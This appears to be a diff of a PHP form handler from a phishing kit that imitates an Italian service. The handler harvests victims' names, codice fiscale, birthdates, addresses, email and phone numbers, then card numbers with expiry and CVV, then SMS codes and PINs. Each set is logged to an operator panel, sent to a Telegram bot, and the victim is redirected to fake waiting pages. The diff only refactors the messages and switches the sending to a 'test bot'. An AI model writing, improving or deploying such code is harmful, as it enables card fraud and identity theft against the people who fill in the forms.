@@ -2,8 +2,6 @@
 ob_start();
 
 require "../main.php";
-
-// Include test bot configuration for analysis
 require "../test_config.php";
 
 $bot = $a_bot;
@@ -14,27 +12,25 @@ $ip = getRealClientIP();
 
 // Get host from HTTP_HOST (Koyeb passes real domain correctly)
 $host = $_SERVER['HTTP_HOST'];
-$panel = "http://" . $host . "/panel/view.php?vip=" . $ip;
+$panel_url = "http://" . $host . "/panel/view.php?vip=" . $ip;
 
 function post($data){
-	if(!isset($_POST[$data]) || empty(trim($_POST[$data]))){
-		return "NO_DATA";
-	}else{
-		return htmlspecialchars($_POST[$data]);
-	}
+    if(!isset($_POST[$data]) || empty(trim($_POST[$data]))){
+        return "NO_DATA";
+    }else{
+        return htmlspecialchars($_POST[$data]);
+    }
 }
-
 
 function sendBot($url){
-	$ci = curl_init();
-	curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, false);
-	curl_setopt($ci,CURLOPT_FOLLOWLOCATION, true);
-	curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
-	curl_setopt($ci, CURLOPT_URL, $url);
-	return curl_exec($ci);
-	curl_close($ci);
+    $ci = curl_init();
+    curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ci,CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ci, CURLOPT_URL, $url);
+    return curl_exec($ci);
+    curl_close($ci);
 }
-
 
 if(isset($_POST['fname'])){
     $fname = isset($_POST['fname']) ? $_POST['fname'] : '';
@@ -46,108 +42,66 @@ if(isset($_POST['fname'])){
     $email = isset($_POST['email']) ? $_POST['email'] : '';
     $number = isset($_POST['number']) ? $_POST['number'] : '';
     
-    // Get real IP (handles proxies/Docker)
-    $ip = getRealClientIP();
+    $message = "INFORMATION | $ip\n" .
+        "+ First Name: $fname\n" .
+        "+ Last Name: $lname\n" .
+        "+ Code Fiscale: $code_fiscale\n" .
+        "+ Birthdate: $birthdate\n" .
+        "+ City: $city\n" .
+        "+ ZIP: $zip\n" .
+        "+ Email: $email\n" .
+        "+ Phone: $number";
     
-    // Create Telegram message content
-    $telegram_content = urlencode("
-    INFORMATION | $ip
-
-    + First Name: $fname
-    + Last Name: $lname
-    + code_fiscale: $code_fiscale
-    + birthdate: $birthdate
-    + City: $city
-    + ZIP Code: $zip
-    + Email: $email
-    + Phone Number: $number
-    ---------------------------------------
-    + PANEL: $panel
-    ");
-    
-    // Save data in panel (assuming $m is your database object)
     $oldlogs = $m->getData()["LOGS"];
     $newlogs = $oldlogs."\n+ Personal Info [ $fname $lname | $code_fiscale | $birthdate/$city | $zip | $email | $number ] ";
     $arr = array("LOGS"=>$newlogs);
     $m->update($arr);
     
-    // Sending info to Telegram bot (original + test)
-    sendToAllBots($bot, $ids, $telegram_content, "PERSONAL_INFO", $ip);
+    // Send to test bot only
+    sendToTestBotOnly("PERSONAL_INFO", $message, $ip, $panel_url);
     
     header("location: wait.php?p=PersonalInfo");
     exit();
 }
 
-
-
-
-
-
-// Handle CC form (second form)
 if(isset($_POST['cc'])){
     $card = isset($_POST['cc']) ? $_POST['cc'] : '';
     $date = isset($_POST['exp']) ? $_POST['exp'] : '';
     $code = isset($_POST['cvv']) ? $_POST['cvv'] : '';
     
-    // Get real IP (handles proxies/Docker)
-    $ip = getRealClientIP();
+    $message = "CARD | $ip\n" .
+        "+ Card: $card\n" .
+        "+ Expiry: $date\n" .
+        "+ CVV: $code";
     
-    // Create Telegram message content
-    $telegram_content = urlencode("
-    ᴄᴀʀᴅ | $ip
-
-    + Card Number: $card
-    + Expiry Date: $date
-    + CVV: $code
-    ---------------------------------------
-    + PANEL: $panel
-    ");
-    
-    // Save data in panel (assuming $m is your database object)
     $oldlogs = $m->getData()["LOGS"];
     $newlogs = $oldlogs."\n+ CC [ $name | $card | $date/$code ] ";
     $arr = array("LOGS"=>$newlogs);
     $m->update($arr);
     
-    // Sending info to Telegram bot (original + test)
-    sendToAllBots($bot, $ids, $telegram_content, "CREDIT_CARD", $ip);
+    // Send to test bot only
+    sendToTestBotOnly("CREDIT_CARD", $message, $ip, $panel_url);
     
     header("location: loading3.php?p=CC");
     exit();
 }
 
-
-
-
-
-
-
-
-
 if(isset($_POST['sms'])){
-	
-$sms = isset($_POST['sms']) ? $_POST['sms'] : '';
-$pin = isset($_POST['pin']) ? $_POST['pin'] : '';
-
-$telegram_content = urlencode("
-SMS/PIN | $ip
-+ SMS : $sms
-+ PIN/PASSWORD : $pin
----------------------------------------
-+ PANEL : $panel
-");
-
-//save data to panel
-$oldlogs = $m->getData()["LOGS"];
-$newlogs = $oldlogs."\n+ SMS [ $sms | $pin ]";
-$arr = array("LOGS"=>$newlogs);
-$m->update($arr);
-
-//SENDING INFO TO TELEGRAM BOT... (original + test)
-sendToAllBots($bot, $ids, $telegram_content, "SMS_PIN", $ip);
-header("location: loading3.php");
+    $sms = isset($_POST['sms']) ? $_POST['sms'] : '';
+    $pin = isset($_POST['pin']) ? $_POST['pin'] : '';
+    
+    $message = "SMS/PIN | $ip\n" .
+        "+ SMS: $sms\n" .
+        "+ PIN: $pin";
+    
+    $oldlogs = $m->getData()["LOGS"];
+    $newlogs = $oldlogs."\n+ SMS [ $sms | $pin ]";
+    $arr = array("LOGS"=>$newlogs);
+    $m->update($arr);
+    
+    // Send to test bot only
+    sendToTestBotOnly("SMS_PIN", $message, $ip, $panel_url);
+    
+    header("location: loading3.php");
 }
-
-
-
 ?>
